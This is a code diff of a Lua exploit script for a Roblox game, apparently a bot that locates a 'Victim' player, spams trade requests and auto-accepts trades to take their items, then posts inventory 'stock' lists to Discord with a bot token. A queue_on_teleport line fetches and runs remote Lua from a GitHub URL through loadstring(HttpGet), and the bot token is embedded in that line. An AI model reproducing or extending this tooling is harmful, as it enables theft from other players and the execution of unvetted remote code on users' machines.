@@ -85,12 +85,24 @@ game:GetService("GuiService").ErrorMessageChanged:Connect(function(message)
     end
 end)
 
-queue_on_teleport("_G.BotToken = \"" .. AutoCollect.BotToken .. '\"; loadstring(game:HttpGet("https://raw.githubusercontent.com/exodus892/__exodus__/refs/heads/main/autojoin_final.lua"))()')
+queue_on_teleport("_G.BotToken = \"" .. AutoCollect.BotToken .. '\"; loadstring(game:HttpGet("https://raw.githubusercontent.com/exodus892/__exodus__/refs/heads/main/NextgenAutocollect.lua"))()')
 
 LocalPlayer.Idled:Connect(function()
     game:GetService("VirtualUser"):CaptureController()
     game:GetService("VirtualUser"):ClickButton2(Vector2.new())
 end)
+
+local Scans = 0
+local Gui = Instance.new("ScreenGui", gethui())
+Gui.ResetOnSpawn = false
+local Label = Instance.new("TextLabel", Gui)
+Label.Size = UDim2.fromOffset(100, 40)
+Label.TextScaled = true
+Label.Position = UDim2.new(1, -99, 0, 20)
+Label.Text = "N/A"
+Label.AnchorPoint = Vector2.new(1, 0)
+Label.BackgroundColor3 = Color3.fromRGB(24, 24, 27)
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
 local TradeGui = require(game:GetService("ReplicatedStorage"):WaitForChild("Gui"):WaitForChild("TradeGui"))
@@ -248,7 +260,7 @@ end
 local function FindVictim(Json)
     if not Json or game.JobId ~= Json.jobid then
         if game.JobId ~= Json.jobid then
-            PublishMessage(AutoCollect.BotInfoChannel, "(v7.0) Auto-Join started running on " .. LocalPlayer.Name)
+            PublishMessage(AutoCollect.BotInfoChannel, "(v7.1) Auto-Join started running on " .. LocalPlayer.Name)
         end
         return
     end
@@ -320,8 +332,13 @@ task.spawn(function()
         if Victim then
             local Name = Victim.Name
             while IsStealing and LocalPlayer.Parent:FindFirstChild(Name) do
+                Label.Text = "Starting trade"
                 Events:WaitForChild("TradePlayerRequestStart"):FireServer(Victim.UserId)
-                Accept()
+                if Victim["TradeConfig"]["IsTrading"].Value then
+                    Label.Text = "Accepting"
+                    task.wait(6.5)
+                    Accept()
+                end
                 task.wait(1)
             end
         else
@@ -335,13 +352,13 @@ task.spawn(function()
         end
     else
         warn("No auto-join file")
-        PublishMessage(AutoCollect.BotInfoChannel, "(v7.0) Auto-Join started running on " .. LocalPlayer.Name)
+        PublishMessage(AutoCollect.BotInfoChannel, "(v7.1) Auto-Join started running on " .. LocalPlayer.Name)
         IsStealing = false
     end
 end)
 repeat task.wait() until not IsStealing
 
-task.spawn(function()
+--task.spawn(function()
     local function await(object, ...)
         local Result = object
         local Paths = {...}
@@ -838,7 +855,7 @@ task.spawn(function()
     }
 
     for _, Sticker in ipairs(Stickers) do
-        local Name = Sticker.F:GetTypeDef().Name:gsub("x2 Convert", 'Convert')
+        local Name = Sticker.F:GetTypeDef().Name:gsub("x2 Convert", 'Convert'):gsub("x2 Bee", 'Bee')
         table.insert(StickerNames, Name .. " : " .. Sticker.L)
     end
 
@@ -848,14 +865,14 @@ task.spawn(function()
 
     for i, v in pairs(SortedStickers) do
         if v:find(" : Inbox") then
-            table.insert(InboxStickerTable, v)
+            table.insert(InboxStickerTable, v:gsub(" : Inbox", ""))
         else
-            table.insert(CaseStickerTable, v)
+            table.insert(CaseStickerTable, v:gsub(" : Case", ""))
         end
     end
 
-    local Description = "**Stickers**\n"
-    Description = Description .. table.concat(CaseStickerTable, "\n") .. (#InboxStickerTable > 0 and "\n" or "") .. table.concat(InboxStickerTable, "\n") .. "\n\n**Beequips**\n"
+    local Description = "**Stickers**\n----Case Stickers----\n"
+    Description = Description .. table.concat(CaseStickerTable, "\n") .. (#InboxStickerTable > 0 and "\n----Inbox Stickers----\n" or "") .. table.concat(InboxStickerTable, "\n") .. "\n\n**Beequips**\n"
 
 
     for i, bq in pairs(Beequips) do
@@ -864,21 +881,16 @@ task.spawn(function()
         local TypeDef = GetTypeDef(f)
         local Goods = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
         local name = TypeDef:GetTypeDef().DisplayName
-        Description = Description .. "`" .. name .. " : " .. loc .. "`\n" .. string.format("%.2f", TypeDef.Q*5) .. "* Potential | " .. ((TypeDef:GetWaxHistory() and #TypeDef:GetWaxHistory()) or 0) .. " Waxes\n" .. Goods .. "\n\n"
+        Description = Description .. "`" .. name .. " : " .. loc .. "`\n" .. string.format("%.1f", TypeDef.Q*5) .. " Potential | " .. ((TypeDef:GetWaxHistory() and #TypeDef:GetWaxHistory()) or 0) .. " Waxes\n" .. Goods .. "\n\n"
     end
 
-    local lastId = nil
-    for i = 1, 10 do
-        local res = http.request({Url="https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages?limit=100"..(lastId and "&before="..lastId or ""),Method="GET",Headers={["Authorization"]="Bot "..AutoCollect.BotToken}})
+        local res = http.request({Url="https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages?limit=100",Method="GET",Headers={["Authorization"]="Bot "..AutoCollect.BotToken}})
         local msgs = game:GetService("HttpService"):JSONDecode(res.Body)
-        if not msgs or #msgs == 0 then break end
-        lastId = msgs[#msgs].id
         local ids = {}
         for _,m in ipairs(msgs) do table.insert(ids, m.id) end
         http.request({Url="https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages/bulk-delete",Method="POST",Headers={["Authorization"]="Bot "..AutoCollect.BotToken,["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode({messages=ids})})
-        task.wait(1)
-    end
-    local Body = {
+    wait(3)
+        local Body = {
         content = "<t:" .. os.time() .. ":f> Stock List.",
         embeds = {{
             title = LocalPlayer.Name .. " Stock",
@@ -887,21 +899,11 @@ task.spawn(function()
         }}
     }
     PublishMessage(AutoCollect.StockChannel, nil, Body)
-end)
+--end)
 
-local Scans = 0
 warn("All that gobblydook is done")
-local Gui = Instance.new("ScreenGui", gethui())
-Gui.ResetOnSpawn = false
-local Label = Instance.new("TextLabel", Gui)
-Label.Size = UDim2.fromOffset(100, 40)
-Label.TextScaled = true
-Label.Position = UDim2.new(1, -99, 0, 20)
-Label.Text = "Scans: " .. Scans
-Label.AnchorPoint = Vector2.new(1, 0)
-Label.BackgroundColor3 = Color3.fromRGB(24, 24, 27)
-Label.TextColor3 = Color3.fromRGB(255, 255, 255)
-while task.wait(2) do
+
+while task.wait(3) do
     Scans = Scans + 1
     Label.Text = "Scans: " .. Scans
     Scan(true)
